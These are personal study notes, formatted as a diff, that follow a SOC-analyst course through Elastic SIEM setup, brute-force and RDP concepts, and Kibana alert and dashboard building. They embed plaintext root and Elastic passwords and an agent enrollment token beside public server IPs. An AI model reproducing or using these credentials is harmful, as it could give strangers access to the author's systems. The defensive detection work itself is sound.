+                NOTE: for this SIEM, we don't want all the Defender Events. Many are just informational. For example, in Event Viewer, for Windows Defender, Event ID 1151 is stating "Endpoint Protection client health report"; and Event  ID 1150 is stating "Endpoint Protection client is up and running in a healthy state". We will just be using Event ID's 1116, 1117, and 5001. 
+                Per "Review event logs and error codes to troubleshoot issues with Microsoft Defender Antivirus"
+                https://learn.microsoft.com/en-us/defender-endpoint/troubleshoot-microsoft-defender-antivirus
+                (found by Googling "microsoft defender 1116")
+                  1116: "The antimalware platform detected malware or other potentially unwanted software."
+                  1117: "The antimalware platform performed an action to protect your system from malware or other potentially unwanted software."
+                  5001: "Real-time protection is disabled."
+          Where to add this integration?
+            Existing hosts
+              Agent policy: MyDFIR-Windows-Policy
+                NOTE: Agent policies are used to manage a group of integrations across a set of agents.
+          [Save and Continue]
+          [Save and deploy changes]
+  VERIFY -integration of agent logs into Elasticsearch
+    Browser/Elasticshearch > Menu Analytics > Discover
+      NOTE: agents seem to be up and running
+      search > "sysmon"                 ~no results
+      search > "defender"               ~no results
+    TROUBLESHOOT -agents are running (?) but no logs
+      1. check Integrations, to get name of the event ids from all the Exported Fields to better search in "Discover"
+        a. Menu > Management > Integrations > Installed Integrations > Custom Windows Event Logs > Exported Fields > scroll down a bit > the name is: "winlog.event_id"
+        b. Menu > Analytics > Discover > search "winlog.event_id: *" 
+             set time (upper right corner) to "Last 24 hours"
+          NOTE: this should show "any" winlog.event_ids, but it still has no results
+      2. check Datasets, to see what is being collected
+        a. Menu > Analytics > Discover > Available Fields >
+      3. check the management for the Fleet and the agent
+        a. Menu > Management > Fleet > MYDFIR-WIN-RUDI
+          NOTE: agent is showing recent activity 
+        b. click on host > Agent details > shows "Healthy"
+          1. Integrations > MYDFIR-WIN-Sysmon > [down arrow] > input > winlog > "There are no log messages to display"
+          2. same for Defender
+      4. restart service in Windows computer
+        a. RDP > 216.128.178.5 > WinSearch > "services" (or "services.msc") > Elastic Agent > [RC] > Restart
+        b Browser/Elastic > Management > Fleet > MYDFIR-WIN-RUDI > Integrations > MYDFIR-WIN-Sysmon
+          NOTE: still no logs 
+      5. check Firewall rules (and modify)
+        NOTE whenever you see the Agent's CPU and Memory as "N/A", that could be a good indicator that the Agents don't have any connectivity towards the Elasticsearch Instance
+        a. Vultr > Products > Network > Firewall > select the [edit "pencil"] from firewall "96592ee8-1f33-4394-b6a6-0ad0ce83d674"
+        b. Manage Firewall Group > Inbound IPv4 Rules 
+          NOTE: a new rule is needed to "accept" TCP on port 9200 (for Elastic Agents), from Anywhere (for now, so we don't run this again during setup)
+      NOTE: after a couple minute, and refreshing the Fleet > MYDFIR-WIN-RUDI page, the CPU & Memory are showing values; and both Integration > Input > "winlog" are showing logs.
+        NOTE: to see the Windows Events (in this case, Event ID 1) go to Menu > Analytics > Discover > search "winlog.event_id: 1"
+        This now shows all the logs with Event ID 1 
+          NOTE: [LC] on the small [expand double arrows] at the start of a log to "Toggle dialog with details" to see the info in table form (or JSON) in a separate panel. Scroll down (or change page), the "event.provider" lists "Microsoft-Windows-Sysmon"
+          The same works for Defender if searched for "winlog.event_id: 5001" and the Windows Defender's Real Time Protection was turned on and off (ID 5001 is the "off" event)
+      (JOY...)
+
+_____________________________________________________________________
+9/11/2024
+What is a Brute Force Attack? | Day 11
+  https://www.youtube.com/watch?v=Tv57yhAOb6g
+      (BTW the current total Vultr charges are $44.96 at 11:53am for the 3 computes) 
+  INTRODUCTION -brief introduction to of brute force attacks (using multiple attempts to "guess" a username and/or password)
+    Three common types of brute force attacks are:
+      1. "simple" Brute Force Attacks -trying all possible combinations, usually in an automated fashion.
+      2. Dictionary Attack -similar to a simple brute force attack, but uses a word list of common passwords, words from the dictionary, or common phrases. Higher chance of success, due to humans using common words, numbers, phrases, and repeated passwords
+      3. Credential Stuffing -using "credential dumps" of already broken-in-to accounts trying all of them, one after another, an a automated fashion to see if any work on an account
+    Protection from Brute Force Attacks (and many other attacks):
+      1. Long password/phrases along with a password manager
+      2. Multifactor Authentication
+      3. Stay Vigilant -always be on the lookout for possibles attacks, and investigate unusual or suspicious behavior
+    For business's (and really anyone):
+      1. ask yourself "What assets are publicly available?"
+        a. "Should they be?"
+      2. "What about the services?"
+        b. turn off SSH and RDP or put them behind a firewall
+    Three Common (Kali Linux) tools to brute force with
+      1. Hydra
+      2. HashCat
+      3. JohnTheRipper
+
+_____________________________________________________________________
+9/12/2024
+Ubuntu Server 24.02 Installation | Day 12
+  https://www.youtube.com/watch?v=qsMhmXIqWfc
+      (BTW the current total Vultr charges are $48.00 at 1:10am for the 4 computes) 
+  DEPLOY -Ubuntu Server 24.02 (Cloud Compute Shared CPU, Toronto) 
+    Image: Ubuntu 24.02, 25GB SSD, 1 CPU, 1GB, 2TB Bandwidth ($5/m)
+      NOTE: Steven said; "We don't need the server extremely beefy" I use   the cheapest one available. Shared CPU & Regular Cloud Compute
+    Additional Features: none
+      NOTE: Steven reconsidered the logical setup of the network and decided   to move the Windows Server and the Ubuntu Server out of thVPC for   Security Segmentation reasons
+    Server Setting: default ("everybody have access to the server")
+    Server Hostname & Label: MYDFIR-WIN-RUDI
+    MyDFIR-WIN-RUDI Overview
+      IP Address: 216.128.176.14
+      Username: root
+      Password: G3w]{d+*g2FhDGB*      
+      Netmask: 255.255.254.0
+      Gateway: 216.128.178.1
+  CONNECT -from Windows Powershell 
+    PS> ssh root@216.128.176.14      (JOY...)
+    PS> apt update && apt upgrade -y
+  NOTE: the linux authentication logs are stored in /var/log/auth.log
+    PS> cd /var/log/
+    PS> cat auth.log                      ~already have failed attacks
+    PS> grep -i failed auth.log           ~search for just "failed" 
+    PS> grep -i failed auth.log | grep -i root    ~"failed" and "root"
+      (six failed passwords, but none as root - at least not yet)
+  NOTE: MyDFIR illustrated failed root access on his server. I did not get any of those. Below is his Linux/Bash command to just see the IP address from the those logs.
+    PS> grep -i failed auth.log | grep -i root | cut -d " " -f 9
+
+_____________________________________________________________________
+9/13/2024
+How To Install Elastic Agent on Ubuntu | Day 13
+  https://www.youtube.com/watch?v=QHJr2-Kav4k
+  CREATE -Elastic Agent Policy
+  Browser/Elastic: go to MyDFIR-ELK on the Elastic website
+    IP Address: 155.138.158.83:5601
+      elastic (browser web gui)
+        Username: elastic
+        Password: um472A6Oheg7k-qC03Ur
+    Menu > Management > Fleet > Agent Policy > [Create agent policy]
+      Name: MyDFIR-Linux-Policy
+      [Create Policy]
+    NOTE: check what logs this policy is instructing our SSH Server to push into our Elasticsearch instance.
+      MyDFIR-Linux-Policy > system-3 > Edit System integration
+        Collect logs from System instances:
+          /var/log/auth.log*
+          /var/log/secure*
+      PS/Linux Server -cRheck out log paths. Reconnect if disconnected.
+        PS> ssh root@216.128.176.14
+          (password: G3w]{d+*g2FhDGB*)
+        PS> cd /var/log
+        PS> ls
+          NOTE: auth.log is shown but not secure. 
+          Google "secure linux auth log"
+            (looks like "auth.log" is Debian/Ubuntu, and "secure" is RedHat/CentOS)
+    NOTE: Requires root privileges -This integration has the following data streams that require Elastic Agents to have root privileges. To ensure that all data required by the integration can be collected, enroll agents using an account with root privileges. For more information, see the Fleet and Elastic Agent Guide(opens in a new tab or window)
+      System diskio metrics
+      System syslog logs
+  CREATE -Elastic Agent 
+    Menu > Management> Fleet > Agents > [Add Agent]
+      What type of host do you want to monitor?
+        (MyDFIR-Linux-Policy)
+      Enroll in Fleet?
+        (Enroll in Fleet (recommended))
+      Install Elastic Agent on your host > Linux TAR
+  INSTALL -Elastic Agent
+    PS> cd ~                     ~change into home dir before running
+----------------------------------------------------------------------
+curl -L -O https://artifacts.elastic.co/downloads/beats/elastic-agent/elastic-agent-8.15.1-linux-x86_64.tar.gz
+tar xzvf elastic-agent-8.15.1-linux-x86_64.tar.gz
+cd elastic-agent-8.15.1-linux-x86_64
+sudo ./elastic-agent install --url=https://149.248.51.210:8220 --enrollment-token=T01XbTZaRUJUSFRIRjAtM3M3cXA6VVE4SXM4Q0hRbkt0RlN1LVhoWFNWQQ==
+----------------------------------------------------------------------
+  NOTE: this failed
+    Error: fail to enroll: fail to execute request to fleet-server: x509: certificate signed by unknown authority
+    For help, please see our troubleshooting guide at https://www.elastic.co/guide/en/fleet/8.15/fleet-troubleshooting.html
+  NOTE: remember on Day 7 (9/7/2024), we had the same problem
+    a. self-signed cert is being use so and " --insecure" to the end of the code (after the double equal signs and include the space before the double dash) and re-run
+----------------------------------------------------------------------
+curl -L -O https://artifacts.elastic.co/downloads/beats/elastic-agent/elastic-agent-8.15.1-linux-x86_64.tar.gz
+tar xzvf elastic-agent-8.15.1-linux-x86_64.tar.gz
+cd elastic-agent-8.15.1-linux-x86_64
+sudo ./elastic-agent install --url=https://149.248.51.210:8220 --enrollment-token=T01XbTZaRUJUSFRIRjAtM3M3cXA6VVE4SXM4Q0hRbkt0RlN1LVhoWFNWQQ== --insecure
+----------------------------------------------------------------------
+    (Elastic Agent has been successfully installed.)
+  VERIFY -that the data is coming over
+    Browser/Elastic ... Add agent > (scroll down a bit) 
+      Agent enrollment confirmed
+        1 agent has been enrolled
+      Incoming data confirmed
+        Incoming data received from 1 of 1 recently enrolled agent.
+    Browser/Elastic > Menu > Analytics > Discover > [Refresh]
+      Available field > "agent.name" 
+        (shows all 3 agents - JOY...)
+      NOTE: clicking on the "+" icon after MYDFIR-Linux-RUDI will filter for just agent
+  INVESTIGATE -the linux server to find the failed IP address that we had on Day 12 (9/12/2024)
+    PS> cd /var/log
+    PS> grep -i failed auth.log | grep -i root | cut -d " " -f 9 
+      (wow, now I have a lot... the two IPs that show up the most are 183.81.169.238 and 111.42.35.138)
+    Browser/Elastic > Analytics > Discover > Search
+      "183.81.169.238"              ~remember to set time and Refresh
+      "183.81.169.238 and authentication failure"
+        (wow. 943 instances)
+    ADD -Message Column to the Documents Display
+      [click on expand arrow] > Document > (scroll down a bit) > "message"
+      [hover over "message" for hidden icons] > [Toggle column in Table]
+      (this would make it easier to look for this specific log info)
+
+_____________________________________________________________________
+9/14/2024
+How To Create Alerts and Dashboards in Kibana | Day 14 (1/4)
+  https://www.youtube.com/watch?v=AdUMhT1l1eY
+CREATE Alert -for Brute Force Attacks with ElasticSearch
+  Browser/Elastic: go to MyDFIR-ELK on the Elastic website
+    IP Address: 155.138.158.83:5601
+      elastic (browser web gui)
+        Username: elastic
+        Password: um472A6Oheg7k-qC03Ur
+  QUERY -data for failed authentications  
+    Menu > Analytics > Discover
+      Filter for SSH attempts (that'll be on the Linux Server)
+        Available Field > agent name > MYDIFIR-Linux-RUCI > "+"
+          NOTE: that'll currently show 8374 events if the time is set for "Today" (it's 4:30am on 9/14/2024)
+      Filter for Fields with data such as "Failed Attempts", "User", and "Source IP" (or whatever else might seem appropriate), by using a combination of the SearchBar and looking through the Available Fields. (remember that available fields are generated by the fields that come from the ingested logs). 
+      These are one ones chosen in the lesson:
+        system.auth.ssh.events
+        user.name
+        source.ip
+        source.geo.country_name
+          NOTE: to filter on these fields, add them to the Documents view by clicking on the "+" icon in the field. This will add that field as a column.
+          NOTE: if just a "-" shows in the column, it means that the field itself does not exist, even though there is data in that field name. Use the SearchBar and KQL sytax to better define the query.
+            (ie. system.auth.ssh.event : * )
+              (BTW the SearchBar is intelligent enough to supply the available options in a drop-down so you don't have to type everything)
+          NOTE: the system.auth.ssh.event column currently shows both "Failed" and "Invalid" events. To just use Failed attempts, select one of the "Failed" and then the "+" icon
+      SAVE -the search, by using the save button in  the top right of the Discovery screen. 
+        Title: SSH Failed Activity
+  ALERT -with the a rule based on the Query
+    Alerts (top right) > Create search threshold rule > Create Rule
+      Name: MYDFIR-SSH Brute Force Activity-RUDI
+      Elasticsearch query
+        Data View: 
+.alerts-security.alerts-default,apm-*-transaction*,auditbeat-*,endgame-*,filebeat-*,logs-*,packetbeat-*,traces-apm*,winlogbeat-*,-*elastic-cloud-logs-*
+        Define your query: system.auth.ssh.event : * 
+          agent.name: MYDFIR-Linux-RUDI
+          system.auth.ssh.event: Failed
+      NOTE: that because Alert was selected from the Discovery page and created a new alert, most of the query data is auto-filled
+        Set the group, threshold, and time window (and test)
+          When: count()
+          Over: all documents
+          Is Above: 5
+          For The Last: 5 minutes
+          ...
+          Check every: 1 minute
+        [Test query]
+        [Save] > Save rule with no action? (upcoming lesson) > [Save rule]
+CREATE Dashboard -to visualize where these attacks are sourcing from
+  [Menu] > Analytics > Maps > SearchBar > Filter your data using KQL syntax
+    system.auth.ssh.event : * and agent.name: MYDFIR-Linux-RUDI and system.auth.ssh.event: Failed
+      NOTE: get this info from recreating your saved query; which can be accessed in the Menu under "Recently viewed".
+      NOTE: get the query and all filters; and separate them with logical "and" (I just copied-and-pasted into a text file and again into the SearchBar)
+      NOTE: no map date will be show until a layer is added
+    Add Layer > Choropleth
+      Boundaries source (how the Map Layer will display)
+        Admin boundaries [checked]
+        EMS Boundaries: World Countries
+        Join field: ISO 3166-1 alpha-2 code
+      Statistics source (where the Map Layer will get it's data from)
+          Data view: .alerts-security.alerts-default,apm-*-transaction*,auditbeat-*,endgame-*,filebeat-*,logs-*,packetbeat-*,traces-apm*,winlogbeat-*,-*elastic-cloud-logs-*
+            NOTE: This one of the drop-down choices; but it can also be found by going to: [Menu] > Discovery > Data view
+            (the data view drop-down dialog is right under the Menu icon (hamburger) in the top right of the page). 
+            NOTE: It would be best to open the Discovery page in a New Tab to check, because nothing on the Map page has been saved, yet...
+          Join field: source.geo.continent_code
+            NOTE: in the Lesson, Steven initially chose "source.geo.continent_name" but that generated the following error:
+              An error occurred when adding join metrics to layer features
+                Left field values do not match right field values. Left field: 'ISO 3166-1 alpha-2 code' has values: AD,AE,AF,AG,AI (5 of 500). Right field: 'source.geo.continent_name' has values: Europe,Asia,Oceania,North America,Africa (5 of 6).
+          [Add and Continue] 
+            NOTE: this brings up the World Countries Settings (i.e Layer Settings, Tooltip fields, Joins, Layer style), but in the  lesson we're leaving these all as their defaults
+      [SAVE] > Save Map
+        Title: SSH Failed Authentications  ~see NOTE, below
+        Add to dashboard: New              ~we haven't built one, yet
+        [Save and go to Dashboard]
+          NOTE: in the Lesson, Steven initially chose SSH Network Map, but changed it in the Dashboard, by clicking on the title which brings up a Settings panel...
+      Adjust the map to your liking
+    [SAVE] > Save the Dashboard
+      Title: MyDFIR-Authentication Activity.
+    CREATE -another Map for for Successful Authentications
+      1. Duplicate the existing Map (the map tile has a menu icon in the top right corner)
+      2. change the Settings to Query for "Accepted" instead of "Failed" by editing the Query field
+      3. [Save and return]
+        NOTE: in the Lesson, Steven initially tried "Successful", but when that didn't display any info for any time, he went back to the Discovery page and looked up what the correct word was by checking the system.auth.ssh.event field. While it initially showed only the Failed events (remember it we set it that way to only show failed events), by editing the word "Failed" in the SearchBar to "*". This will now show all possible system.auth.ssh.event events. 
+      4. [Refresh] and adjust the time if necessary  
+      5. [Save]
+
+_____________________________________________________________________
+9/15/2024
+Remote Desktop Protocol Introduction | Day 15 (High-Level)
+  https://youtu.be/tNhGxtKZo7c?si=m99s8iQAkgvqT-MG
+INTRODUCTION -brief introduction to Remote Desktop Protocol (RDP) that's used for communication between the Terminal Server and the Terminal Server Client to connect to and control a remote device from your PC. RDP is encapsulated and encrypted within TCP; and with a default port of 3389.
+  • RDP abused in over 90% of cyber attacks, Sophos finds, 
+  https://www.sophos.com/en-us/press/press-releases/2024/04/cybercriminals-abuse-remote-desktop-protocol-rdp-90-attacks-handled
+WHY IS IT? -people like to use RDP by enabling this protocol users can remotely connect to their endpoints to work or troubleshoot problems that arise without physically going into the office or wherever their endpoints are located by doing things remotely it saves a lot of commute time makes everything more accessible and convenient however with accessibility and convenience comes with risk where attackers would attempt to abuse this
+protocol
+HOW DOES IT GET ABUSED? -an attacker could gain initial access into
+an organization's environment is through an exposed RDP service from a server because anybody from the internet can connect to that server using RDP and then attempt to authenticate via Brute Force or they could authenticate using a valid account that they had phished. An attacker in the environment, depending on the level of access that they have, could then perform credential dumping to gather valid credentials found on that server and then use those credentials to move laterally onto other machines within the same network using RDP. Then they could try to Exfiltrate Data or install Ransomware.
+HOW TO FIND EXPOSED RDP SERVERS? -the more that you are aware of these issues, the faster you can do something about it
+  Shodan (https://www.shodan.io) "Search Engine for the Internet of Everything" -"The World's 1st search engine for Internet connected devices. Discover how Internet intelligence can help you make better decisions"
+    Typing in Remote Desktop Protocol in the SearchBar shows 3,746,877 Results of exposed RDPs
+  Censys (https://www.censys.com) " Leading Internet Intelligence Platform for Threat Hunting and Attack Surface Management"
+HOW TO PROTECTYOURSELF -
+  1. Turn RDP OFF! -if or when not in use
+  2. Multifactor Authentication -particularly on RDP (with Active Directory)
+  3. Restrict Access -Firewalls (certain IPs) and VPNs
+  4. Better Passwords -even better, use PAM (Privilege Access Management)
+  5. Change Default Accounts -create a completely different account that is named something different
+
+_____________________________________________________________________
+9/17/2024
+How To Create Alerts and Dashboards in Kibana | Day 16 (2/4)
+  https://youtu.be/11eBIfDeZ7k?si=WQHA22ll7rbGWWGM
+CREATE SEARCH -and Observe Logs from the Windows Server (MyDFIR-WIN-RUDI)
+  (we're focused on RDP, and Brute Forced attacks which show Failed Authentications)
+  Browser/Elastic > [Menu] > Discover 
+    Timeframe: Today   (97,454 events)
+    Available Fields > agent.name > MyDFIR-WIN-RUDI > [+]
+    NOTE: use Google to find the Event Id
+      "failed authentication event id windows"
+        "Event ID 4625: “An account failed to log on” - This event is generated when an account logon attempt fails, including incorrect passwords, locked-out accounts, or accounts with restrictions (e.g., day-of-the-week or time-of-day restrictions). The event includes information such as:
+          Logon Type (e.g., interactive, network, or service)
+          Account Name
+          Authentication Package (e.g., NTLM or Kerberos)
+          Result Code (indicating the reason for failure)"
+    NOTE: expanding the first log and checking the a likely event name for "4625" doesn't immediately show anything. enter "4625" in the SearchBar to see the correct sytax of the field (might need to close and re-open the expanded Document). the Field name is "event.code" (not very original. I should have probably found that one...)
+      VERIFY -by typing "event.code: 4625" into the SearchBar (JOY...)
+    (still need the user and IP...)
+    Available Fields > Search > "source..." > source.ip > [+]
+    Available Fields > Search > "user.name... > [+]
+      NOTE: searching for "user" had 30 possibilities
+            searching for "user." had 13 possibilities
+            searching for "user.n" has 2 possibilities and one had no data
+      VERIFY - expand the first Document and look for the Message
+        "An account failed to log on."  (JOY...)
+    [SAVE] > Save search > title > "RDP Failed Activity"
+    VERIFY -thats its actually failed RDPs 
+      HA7 > RDP > 216.128.178.5 > (incorrect password) > Error
+      Browser/Elastic > Time > 1 minute > [Refresh]    (yep, that's me...)
+    NOTE: Googl'n for "windows authentication success event id" brings up a web site: "Windows Security Log Event ID 4624
+                 Ultimate Windows Security
+https://www.ultimatewindowssecurity.com › encyclopedia
+                 4624: An account was successfully logged on. On this page. Description of this event; Field level details"
+      Logon Type:
+        2   Interactive (logon at keyboard and screen of system)
+        3   Network (i.e. connection to shared folder on this computer from elsewhere on network)
+        4   Batch (i.e. scheduled task)
+        5   Service (Service startup)
+        7   Unlock (i.e. unattended workstation with password protected screen saver)
+        8   NetworkCleartext (Logon with credentials sent in the clear text. Most often indicates a logon to IIS with "basic authentication") See this article for more information.
+        9   NewCredentials such as with RunAs or mapping a network drive with alternate credentials.  This logon type does not seem to show up in any events.  If you want to track users attempting to logon with alternate credentials see 4648.  MS says "A caller cloned its current token and specified new credentials for outbound connections. The new logon session has the same local identity, but uses different credentials for other network connections."
+        10  RemoteInteractive (Terminal Services, Remote Desktop or Remote Assistance)
+        11  CachedInteractive (logon with cached domain credentials such as when logging on to a laptop when away from the network)
+    NOTE: to find all the saved searched > Open (top right)
+CREATE ALERT - create an alert for Failed RDP Windows Logins
+  Browser/Elastic > Alert > Create Rule
+    Name: MyDFIR-RDP Brute Force Activity-RUDI
+    Elasticsearch query
+    Data View: 
+.alerts-security.alerts-default,apm-*-transaction*,auditbeat-*,endgame-*,filebeat-*,logs-*,packetbeat-*,traces-apm*,winlogbeat-*,-*elastic-cloud-logs-*
+    Define your query: event.code: 4625
+      Set the group, threshold, and time window
+        When: count()
+        Over: all documents
+        Is Above: 5
+        For The Last: 5 minutes
+        ...
+        Check every: 1 minute
+    [Test query]
+  [Save] > Save rule with no action? (upcoming lesson) > [Save rule]
+CHECK ALERTS
+  [Menu] > Stack Management > Alerts & Insights > Alerts
+    [click on Rule Details] > (opens Rule Overview)
+      (doesn't really show much. no user or source IP)
+      NOTE: theses rule (both SSH and RDP) were the Threshold rules created in Analytics > Discover.
+CREATE RULES -more explicit and better detailed rules
+  [Menu] > Security > Rules > Management > Detection rules (SIEM)
+    NOTE: this bring up an option on this the Install Rules page to: 
+      "Load Elastic prebuilt detection rules
+        Elastic Security comes with prebuilt detection rules that run in the background and create alerts when their conditions are met. By default, all prebuilt rules except the Endpoint Security rule are disabled. You can select additional rules you want to enable."
+    [Create new rule] > Threshold (Aggregate query results to detect when number of matches exceeds threshold) > (scroll down...)
+      1. Define Rule
+        Source: (leave as defaults)
+        Custom query: system.auth.ssh.event : * and agent.name:   MYDFIR-Linux-RUDI and system.auth.ssh.event: Failed and user.name:   "root" 
+          NOTE: added user.name "root" to the original query from Day 14,   as its the only user name for SSH that is valid
+        Group by: user.name, source.ip
+          Threshold >= 5
+        Required Fields: source.ip, user.name 
+        [Continue]
+      2. About rule
+        Name: MyDFIR-SSH-Brute-Force-Attempt-RUDI
+        Description: "This rule detects failed authentications towards the account: root"
+        Default severity: Medium
+        Default risk score: (leave as default)
+        >Advanced Settings 
+          (going to leave most of these alone for now, but very cool)
+          Custom highlighted fields: source.ip
+        [Continue]
+      3. Schedule rule
+        Runs every 5 Minutes
+        Additional look-back time: 5 Minutes
+        [Continue]
+      4. Rule Actions
+        (leave defaults)
+        [Create & enable rule]
+          (SSH rule is created. now for RDP...)
+  [Menu] > Security > Rules > Management > Detection rules (SIEM)
+    [Create new rule] > Threshold (Aggregate query results to detect when number of matches exceeds threshold) > (scroll down...)
+      1. Define Rule
+        Source: (leave as defaults)
+        Custom query: event.code: 4625 and agent.name: MYDFIR-WIN-RUDI and user.name: "Administrator" 
+          NOTE: added user.name "Administrator" to the original query from earlier, as its the only user name for RDP that is valid
+          NOTE: while the Lesson did not mention it today, the Query is from the Analytics > Discovery SearchBar (event.code 4625) and the filter on the line below to the left of the SearchBar (agent.name: MYDFIR-WIN-RUDI)
+        Group by: source.ip, user.name 
+          Threshold >= 5
+        Required Fields: source.ip, user.name 
+        [Continue]
+      2. About rule
+        Name: MyDFIR-SSH-Brute-Force-Attempt-RUDI
+        Description: "This rule detects failed authentications towards the account: root"
+        Default severity: Medium
+        Default risk score: (leave as default)
+        >Advanced Settings 
+          (going to leave most of these alone for now, but very cool)
+          Custom highlighted fields: source.ip
+        [Continue]
+      3. Schedule rule
+        Runs every 5 Minutes
+        Additional look-back time: 1 Minutes
+        [Continue]
+      4. Rule Actions
+        (leave defaults)
+        [Create & enable rule]
+  [Menu] > Security > Alerts
+    NOTE: I already have 2 alerts against SSH. there in MUCH more data here, and expanding the Alert (double-arrow to the left of the alert) bring up the Expand Details Side Panel 
+    NOTE: There is a chance that the RDP rule may have spaces in the wrong places or the quotes need to be removed; so it will need watching until an alter is generated
+    NOTE: THESE ARE NOT GOOD RULES. They were just for the Lesson. 
+      (Much better rules can be made with a "LITLE" research...)
+
+_____________________________________________________________________
+9/17/2024
+How To Create Alerts and Dashboards in Kibana | Day 17 (3/4)
+  https://youtu.be/pAfIi6Z6a2g?feature=shared
+CREATE DASHBORD -to visualize where these attacks are sourcing from
+  [Menu] > Analytics > Maps > SearchBar > "event.code: 4625 and agent.name: MYDFIR-WIN-RUDI"
+      NOTE: no map date will be show until a layer is added
+    Add Layer > Choropleth
+      Boundaries source (how the Map Layer will display)
+        Admin boundaries [checked]
+        EMS Boundaries: World Countries
+        Join field: ISO 3166-1 alpha-2 code
+      Statistics source (where the Map Layer will get it's data from)
+        Data view: .alerts-security.alerts-default,apm-*-transaction*,auditbeat-*,endgame-*,filebeat-*,logs-*,packetbeat-*,traces-apm*,winlogbeat-*,-*elastic-cloud-logs-*
+          NOTE: This one of the drop-down choices; but it can also be found by going to: [Menu] > Discovery > Data view
+          (the data view drop-down dialog is right under the Menu icon (hamburger) in the top right of the page). 
+          NOTE: It would be best to open the Discovery page in a New Tab to check, because nothing on the Map page has been saved, yet...
+        Join field: source.geo.country_iso_code
+          (be careful to pick the matching "isc" code, unlike Day 14)
+        [Add and Continue] 
+            NOTE: this brings up the World Countries Settings (i.e Layer Settings, Tooltip fields, Joins, Layer style), but in the  lesson we're leaving these all as their defaults
+              (the Russians must really hate me. 15,923 Attacks in the Last 7 days...)
+      [SAVE] > Save Map 
+        Title: RDP Failed Authentication
+        Add to dashboard: Existing (MyDFIR-Authentication Activity)
+        [Save and go to Dashboard]
+      [Save]
+CREATE DASHBOARD -for "RDP Successful Authentications"
+  [Menu] > Analytics > Maps > SearchBar > "event.code: 4624"
+    NOTE: we found this in Lesson Day 14 when we Googled for "windows authentication success event id", and it brought up a web site: "Windows Security Log Event ID 4624
+                 Ultimate Windows Security
+https://www.ultimatewindowssecurity.com › encyclopedia
+                 4624: An account was successfully logged on. On this page. Description of this event; Field level details"
+      Logon Type:
+        2   Interactive (logon at keyboard and screen of system)
+        3   Network (i.e. connection to shared folder on this computer from elsewhere on network)
+        4   Batch (i.e. scheduled task)
+        5   Service (Service startup)
+        7   Unlock (i.e. unattended workstation with password protected screen saver)
+        8   NetworkCleartext (Logon with credentials sent in the clear text. Most often indicates a logon to IIS with "basic authentication") See this article for more information.
+        9   NewCredentials such as with RunAs or mapping a network drive with alternate credentials.  This logon type does not seem to show up in any events.  If you want to track users attempting to logon with alternate credentials see 4648.  MS says "A caller cloned its current token and specified new credentials for outbound connections. The new logon session has the same local identity, but uses different credentials for other network connections."
+        10  RemoteInteractive (Terminal Services, Remote Desktop or Remote Assistance)
+    NOTE: Expanding one of the Documents and start to look for the syntax for the log on type field name. The message field has some data saying:
+      "An account was successfully logged on.
+       Subject:
+          Security ID:    S-1-5-18
+          Account Name:   MYDFIR-WIN-RUDI$
+          Account Domain:   WORKGROUP
+          Logon ID:   0x3E7
+        Logon Information:
+          Logon Type:   5
+            (according to Logon Type table, thats Service startup)
+        (scroll around to find where else Logon Type 5 is used)
+      The field is "winlog.event_data.LogonType": 5
+        (according to the Logon Table, we need to add "10" (RemoteInteractive) & "7" (Unlock) to the Query.
+  [Menu] > Analytics > Maps > SearchBar > "event.code: 4624 and (winlog.event_data.LogonType:10 or winlog.event_data.LogonType:7)" 
+    (BTW, those are my logons. notice the source IPs)
+    [Save] > Save search 
+      Title: RDP Successful Activity
+      [Save]
+  [Menu] > Analytics > Dashboards
+    RDP Failed Authentication map [Menu] > [LClick] > Duplicate
+    RDP Failed Authentication (copy) map [Menu] > [LClick] > Setting
+      Title: RDP Successful Authentications
+      Query: event.code: 4624 and (winlog.event_data.LogonType:10 or winlog.event_data.LogonType:7)
+        [Update]
+        [Save and Return]
+CREATE VISUALIZATION -to make 4 tables of Users, IPs and Countries of the events from the Maps
+  [Create visualization] > "Drop some fields here to start"
+    SearchBar: system.auth.ssh.event : * and agent.name: MYDFIR-Linux-RUDI and system.auth.ssh.event: Failed
+      NOTE: this will be the first one table
+      Drag the following fields on to the "Lens":
+        @timestamp, source.ip
+          (change the Visualization Type from Bar Vertical to Table)
+        user.name, source.geo.country_name   (not iso)
+      NOTE: remember that you can search for the desired fields
+      NOTE: change the order of the columns by dragging the field in the side panel's Rows section
+        (Time, User, IP, County, Count) 
+        (MyDFIR changed his mind and gor rid of @timestamp, by hovering of the entry in the side panel and Left-Clicking on the trashcan to Delete)
+      NOTE: Edit the Row by Right-Clicking on it in the side panel
+        Number of Values: 10
+        Advanced > Group remaining values as "Other": OFF
+      NOTE: the columns can also be sorted by using the Column Menu icon
+        Count of Records: Descending (bigger on top...) 
+      NOTE: there are 2 Date "Warnings" about accuracy. 
+        (we're going to worry about them now) 
+      [Save and Return]
+        (I believe I forget the title of the Table. LClick on the Title area and type: "SSH Failed Activity [Table]")
+CREATE VIZUALIZATION -remaining table by Duplicating this table and editing their settings for the three remaining tables:
+  SSH Successful Activity [Table]
+    system.auth.ssh.event : * and agent.name: MYDFIR-Linux-RUDI and system.auth.ssh.event: Accepted
+  RDP Failed Authorizations
+    event.code: 4625 and agent.name: MYDFIR-WIN-RUDI
+  RDP Successful Authorizations
+    event.code: 4624 and (winlog.event_data.LogonType:10 or winlog.event_data.LogonType:7) 
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+YOUTUBE COMMENTS
+POST: @MichaelLeone-z1i
+Weird Problem. When I duplicated the SSH Failed Auth Table, the Query/Edit option were just missing. Checked the original. They weren't there either. The Maps all had a Query/Edit option and I was in Edit Mood. I tried 2 different Browsers and a Reboot. No Joy. I ended up using "Edit in Lens". That worked. So did Duplicates made from that one. I competed the Lesson. 
+I left the first Table as it is to play around with it some more, later. Does Anyone know what I did wrong? Or have the same problem?
+  REPLY: @authurpedro
+  Hi, how did you edit with lens am having similar issues when I duplicate and modify the query update and save it will show me no results found
+    REPLY: @MichaelLeone-z1i
+    @authurpedro  Sorry. I've been offline. 
+    In the visualization table with the problem, I clicked on the small hamburger menu icon, then the Edit Visualization and then Edit in Lens (upper right, in the fly-out). I put the query back in the search field, Enter, Save and Return. When I rechecked the Table's Settings, the Edit Query showed up. I just verified this on my last problem visualization, and it worked. I still don't know why it was an issue or why this worked. 
+    Good Luck.
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+_____________________________________________________________________
+9/18/2024
+Command and Control Introduction | Day 18 (High-Level)
+  https://youtu.be/WnOkhGNPmyA?feature=shared
